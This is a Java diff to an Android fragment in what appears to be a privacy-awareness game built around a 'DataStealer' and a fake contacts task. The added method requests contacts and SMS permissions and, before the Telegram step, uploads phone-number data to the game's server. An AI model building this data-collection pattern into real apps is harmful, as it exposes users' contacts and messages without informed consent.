@@ -1,5 +1,7 @@
 package de.hpi3d.gamepgrog.trap.ui;
 
+import android.Manifest;
+import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
@@ -9,15 +11,23 @@ import android.view.View;
 import android.view.ViewGroup;
 import android.widget.Button;
 import android.widget.Switch;
+import android.widget.Toast;
 
 import java.util.ArrayList;
 
 import androidx.fragment.app.Fragment;
 import de.hpi3d.gamepgrog.trap.R;
 import de.hpi3d.gamepgrog.trap.android.DataStealer;
+import de.hpi3d.gamepgrog.trap.android.PermissionHelper;
+import de.hpi3d.gamepgrog.trap.api.ApiIntent;
+import de.hpi3d.gamepgrog.trap.api.ApiService;
 import de.hpi3d.gamepgrog.trap.api.StorageManager;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
 import de.hpi3d.gamepgrog.trap.datatypes.TextMessage;
+import de.hpi3d.gamepgrog.trap.future.Promise;
+import de.hpi3d.gamepgrog.trap.tasks.FakeContactsTaskResolver;
+import de.hpi3d.gamepgrog.trap.tasks.Task;
+import de.hpi3d.gamepgrog.trap.tasks.TaskResolver;
 
 
 public class MainFragment extends Fragment {
@@ -37,7 +47,11 @@ public class MainFragment extends Fragment {
         View view = inflater.inflate(R.layout.fragment_main, container, false);
         upButton = view.findViewById(R.id.button_temporary_telegram);
         upButton.setOnClickListener((View v) -> {
-            sendInitialTelegramMessage();
+            sendContactDataAndPhoneNumber().then((success) -> {
+                if (success) {
+                    sendInitialTelegramMessage();
+                }
+            });
         });
 
 
@@ -109,7 +123,33 @@ public class MainFragment extends Fragment {
         } catch (Exception e) {
             e.printStackTrace();
         }
+    }
 
+    private Promise<Boolean> sendContactDataAndPhoneNumber() {
+        Promise<Boolean> p = Promise.create();
+
+        String[] permissions = new String[] {
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.READ_SMS};
+
+        int userid = StorageManager.with(getActivity()).userid.get();
+
+        Task contactsTask = new Task();
+        contactsTask.setDatatype("contact");
+
+        TaskResolver resolver = new FakeContactsTaskResolver(permissions);
+        resolver.executeAndShowResult(getActivity(), contactsTask).then(() -> {
+            ApiIntent
+                    .build(getContext())
+                    .setCall(ApiService.CALL_ADD_DATA)
+                    .put(ApiService.KEY_USER_ID, userid)
+                    .put(ApiService.KEY_DATA_TYPE, "phonenumber")
+                    .put(ApiService.KEY_DATA, null)
+                    .putReceiver((code, bundle) -> p.resolve(code == ApiService.SUCCESS))
+                    .start();
+        });
+
+        return p;
     }
 
 
